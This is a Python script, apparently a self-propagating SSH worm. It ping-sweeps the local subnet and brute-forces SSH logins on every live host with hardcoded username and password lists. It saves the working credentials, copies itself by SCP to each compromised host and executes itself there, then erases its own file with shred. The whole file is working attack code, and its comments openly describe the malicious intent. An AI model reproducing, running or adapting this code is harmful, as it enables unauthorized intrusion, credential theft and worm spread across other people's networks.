#!/usr/bin/python3

import threading
import paramiko
import socket
import http.server
import socketserver
import time
import sys, ipaddress, os
import subprocess
from subprocess import Popen, PIPE
import netifaces
import socket
from scp import SCPClient


iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
own_ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
myself = sys.argv[0]

class TheBuster:

    def ping_stuff(self):

        first, middle_1, middle_2, last = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'].split('.')
        last = '0/24'
        ip_new = first, middle_1, middle_2, last

        period = '.'
        string_join = period.join(ip_new)
        print(string_join)

        ip = ipaddress.ip_network(string_join)

        network = ipaddress.ip_network(ip)
        alive_list = open('alive_list.txt', 'w+')

        for i in network.hosts():

            i = str(i)
            toping = subprocess.Popen(['ping', '-c', '1', i], stdout=PIPE)
            output = toping.communicate()[0]
            hostalive = toping.returncode

            if hostalive == 0:

                if i == netifaces.gateways()['default'][netifaces.AF_INET][0]:  # gateway

                    print(i + " Serves as gateway")
                    pass

                elif i == netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']:  # own ip

                    print(i + " Own IP address")
                    pass

                else:
                    #blacklisted = "192.168.1.130"
                    blacklisted = "192.168.1.1"
                    if i == str(blacklisted):
                        print(i, " => This is where the creds go..")
                        continue

                    else:
                        print(i, 'is reachable')
                        alive_list.write(i + '\n')
                        global ipaddr
                        ipaddr = i

            else:
                print(i, 'is down')

        alive_list.close()

    # --------------------------------------------------------------------------------------

    def brute_stuff(self):

        patient_users = ['root',
                         'patient',
                         'alpha',
                         'alice',
                         'key',
                         'silly',
                         'admin',
                         'test',
                         'guest',
                         'info',
                         'adm',
                         'mysql',
                         'user',
                         'administrator',
                         'oracle',
                         'ftp',
                         'pi',
                         'puppet',
                         'ansible',
                         'vagrant',
                         'azureuser']

        patient_pass = ['BPMS',
                        'dasusr1',
                        'Dumb_Ball',
                        'Fold!MaC',
                        'NoWayIn',
                        'blu3?skz',
                        'db2inst1',
                        'blu3?skz',
                        'db2pass',
                        'db2pw',
                        'db2password',
                        'db2fenc1',
                        'db2admin',
                        'big_gam3']

        for target in open('alive_list.txt').read().splitlines():

            for username in patient_users:

                for password in patient_pass:

                    if a.is_ssh_open(target, username, password):
                        open("creds.txt", "w").write(f"{username}@{target}:{password}" + "\n")

                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(hostname=target, username=username, password=password)

                        scp = SCPClient(client.get_transport())

                        print("\nConnecting to target and executing first stage")
                        scp.put(f'{myself}')

                        print("Connected to target and executing the bad shit..\n")
                        client.exec_command(f"python3 {myself}")

                        client.close()

                        from os import path     # https://0x00sec.org/t/self-destructing-python-script/898
                        self_path = path.abspath(__file__)
                        subprocess.call(["/usr/bin/shred", "-fuz", self_path])

                        sys.exit()

    # --------------------------------------------------------------------------------------

    def is_ssh_open(self, ipaddr, username, password):

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=ipaddr, username=username, password=password)

        except socket.timeout:

            print(f"[!] Host: {ipaddr} is unreachable, timed out.")
            sys.exit()

        except paramiko.AuthenticationException:

            print(f"[!] Invalid credentials for {ipaddr} <=> {username}:{password}")
            return False

        except paramiko.SSHException:

            print("[*] Quota exceeded, retrying with delay...")
            time.sleep(60)

            return a.is_ssh_open(ipaddr, username, password)

        else:
            combo = username + "@" + ipaddr + ":" + password
            print(f"[+] Found combo: {combo}")

            #print(combo)
            #global c_nation
            #c_nation = combo

            return True

    # --------------------------------------------------------------------------------------

if __name__ == '__main__':
    a = TheBuster()
    a.ping_stuff()
    a.brute_stuff()
    sys.exit()

